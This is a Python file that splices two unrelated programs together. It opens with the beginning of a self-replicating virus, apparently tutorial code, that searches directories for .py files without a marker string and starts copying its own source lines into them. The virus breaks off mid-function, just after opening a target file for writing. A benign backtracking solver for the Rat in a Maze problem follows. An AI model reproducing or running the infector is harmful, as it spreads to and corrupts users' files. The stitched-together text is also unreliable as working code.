#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to solve Rat in a Maze
# problem using backtracking
 
# Maze size
n = 4
 
# A utility function to check if x, y is valid
# index for N * N Maze
 
 
def isValid(n, maze, x, y, res):
    if x >= 0 and y >= 0 and x < n and y < n and maze[x][y] == 1 and res[x][y] == 0:
        return True
    return False
 
# A recursive utility function to solve Maze problem
 
 
def RatMaze(n, maze, move_x, move_y, x, y, res):
    # if (x, y is goal) return True
    if x == n-1 and y == n-1:
        return True
    for i in range(4):
        # Generate new value of x
        x_new = x + move_x[i]
 
        # Generate new value of y
        y_new = y + move_y[i]
 
        # Check if maze[x][y] is valid
        if isValid(n, maze, x_new, y_new, res):
 
            # mark x, y as part of solution path
            res[x_new][y_new] = 1
            if RatMaze(n, maze, move_x, move_y, x_new, y_new, res):
                return True
            res[x_new][y_new] = 0
    return False
 
 
def solveMaze(maze):
    # Creating a 4 * 4 2-D list
    res = [[0 for i in range(n)] for i in range(n)]
    res[0][0] = 1
 
    # x matrix for each direction
    move_x = [-1, 1, 0, 0]
 
    # y matrix for each direction
    move_y = [0, 0, -1, 1]
 
    if RatMaze(n, maze, move_x, move_y, 0, 0, res):
        for i in range(n):
            for j in range(n):
                print(res[i][j], end=' ')
            print()
    else:
        print('Solution does  not exist')
 
 
# Driver program to test above function
if __name__ == "__main__":
    # Initialising the maze
    maze = [[1, 0, 0, 0],
             [1, 1, 0, 1],
             [0, 1, 0, 0],
             [1, 1, 1, 1]]
 
    solveMaze(maze)
 
# This code is contributed by Anvesh Govind Saxena